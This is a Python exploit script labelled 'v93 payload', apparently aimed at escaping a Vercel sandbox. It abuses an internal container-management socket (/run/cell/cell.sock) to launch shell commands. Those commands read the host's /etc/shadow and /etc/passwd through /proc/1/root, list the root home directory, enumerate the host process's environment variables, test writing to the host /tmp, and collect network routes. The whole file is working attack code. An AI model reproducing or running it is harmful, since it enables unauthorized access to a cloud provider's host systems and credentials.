# -*- coding: utf-8 -*-
"""v93 payload: 主进程命令执行能力验证 (v92 突破: Create(command)+SO保持+Start → 输出可见)
A: 基础环境 (id/uname/cgroup/ls / /vercel)
B: 宿主 rootfs 视图 (/proc/1/root: ls/shadow/passwd/root)
C: celld 环境变量键名 (值打码, 只显示 KEY=<len:N>)
D: 宿主 /tmp 写测试 + 网络信息
"""
import socket, time, os, json, re, struct, threading

OUT = '/vercel/sandbox/v93c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v93c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pvar(field_no, n):
    return pvarint((field_no << 3) | 0) + pvarint(n)


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def grpc_req(pl):
    return b'\x00' + struct.pack('>I', len(pl)) + pl


class Keep:
    """保持连接: 后台线程发请求并持续读, 1s 轮询 stop"""
    def __init__(self, path, body, t=20):
        self.path, self.body, self.t = path, body, t
        self.data = bytearray()
        self.done = threading.Event()
        self._stop = threading.Event()
        self._err = None
        self._t = threading.Thread(target=self._run)
        self._t.daemon = True

    def _run(self):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect('/run/cell/cell.sock')
            req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
                   'Content-Length: %d\r\nConnection: keep-alive\r\n\r\n' % (self.path, len(self.body)))
            s.sendall(req.encode() + self.body)
            deadline = time.time() + self.t
            while not self._stop.is_set() and time.time() < deadline:
                try:
                    chunk = s.recv(8192)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if not chunk:
                    break
                self.data += chunk
            try:
                s.close()
            except Exception:
                pass
        except Exception as e:
            self._err = e
        self.done.set()

    def start(self):
        self._t.start()
        return self

    def stop(self):
        self._stop.set()

    def status(self):
        return 'done=%s err=%s data=%d' % (self.done.is_set(), self._err, len(self.data))


def extract_frames(d):
    """从 chunked HTTP body 提取 grpc 数据帧内容 (StreamOutputResponse.data 拼接)"""
    idx = d.find(b'\r\n\r\n')
    if idx >= 0:
        d = d[idx + 4:]
    out = b''
    while d:
        nl = d.find(b'\r\n')
        if nl < 0:
            break
        try:
            size = int(d[:nl], 16)
        except Exception:
            break
        if size == 0:
            break
        chunk = d[nl + 2:nl + 2 + size]
        if len(chunk) >= 5 and chunk[0] == 0:
            pl = chunk[5:]
            if pl.startswith(b'\x0a'):
                v = 0
                shift = 0
                i = 1
                while i < len(pl):
                    b = pl[i]
                    v |= (b & 0x7f) << shift
                    i += 1
                    if not (b & 0x80):
                        break
                    shift += 7
                out += pl[i:i + v]
        d = d[nl + 2 + size + 2:]
    return out


def main():
    log('V93 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    def create(body, tag):
        st, bd = rpc(CTR + '/Create', body, t=8)
        cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
        log('%s CREATE -> %s cid=%s' % (tag, st, cid or bd[:120]))
        return cid

    def run_cmd(tag, cmdline, wait=6):
        body = json.dumps({"drive_id": "sandbox", "command": "/bin/sh", "arguments": ["-c", cmdline]})
        cid = create(body, tag)
        if not cid:
            return
        k = Keep(CTR + '/StreamOutput', grpc_req(pstr(1, cid) + pvar(2, 1)), t=15).start()
        time.sleep(1.0)
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        log('%s started, waiting %ds' % (tag, wait))
        time.sleep(wait)
        d = bytes(k.data)
        txt = extract_frames(d).decode(errors='replace')
        log('%s SO %s rawlen=%d' % (tag, k.status(), len(d)))
        log('%s OUT<<<\n%s\n>>>' % (tag, txt[:2500]))
        k.stop()
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('%s killed' % tag)
        time.sleep(0.5)

    # A. 基础环境
    run_cmd('A1', 'id; uname -a; hostname; pwd; cat /proc/self/cgroup 2>&1 | head -c 600; echo; '
                  'ls -la / 2>&1 | head -25; echo ===V===; ls -la /vercel 2>&1 | head; '
                  'ls -la /vercel/sandbox 2>&1 | head -8')

    # B. 宿主 rootfs 视图
    run_cmd('B1', 'echo ===PROC1===; ls -la /proc/1/ 2>&1 | head -18; echo ===ROOT===; '
                  'ls -la /proc/1/root/ 2>&1 | head -30; echo ===SHADOW===; '
                  'head -c 400 /proc/1/root/etc/shadow 2>&1; echo; echo ===PASSWD===; '
                  'head -c 400 /proc/1/root/etc/passwd 2>&1; echo; echo ===HOMEROOT===; '
                  'ls -la /proc/1/root/root/ 2>&1 | head -12')

    # C. celld 环境变量键名 (值打码)
    run_cmd('C1', 'tr "\\000" "\\n" < /proc/1/environ 2>&1 | sed "s/=.*/=<len-only>/" | head -50; '
                  'echo ===ROOTPROC1===; tr "\\000" "\\n" < /proc/1/root/proc/1/environ 2>&1 | '
                  'sed "s/=.*/=<len-only>/" | head -50')

    # D. 宿主 /tmp 写测试 + 网络
    run_cmd('D1', 'echo V93_WRITE_TEST_MARKER_98765 > /proc/1/root/tmp/v93_write_test 2>&1; '
                  'cat /proc/1/root/tmp/v93_write_test 2>&1; ls -la /proc/1/root/tmp/v93_write_test 2>&1; '
                  'echo ===NET===; cat /proc/net/route 2>&1; echo; cat /etc/hostname 2>&1')

    log('V93C_DONE')


main()
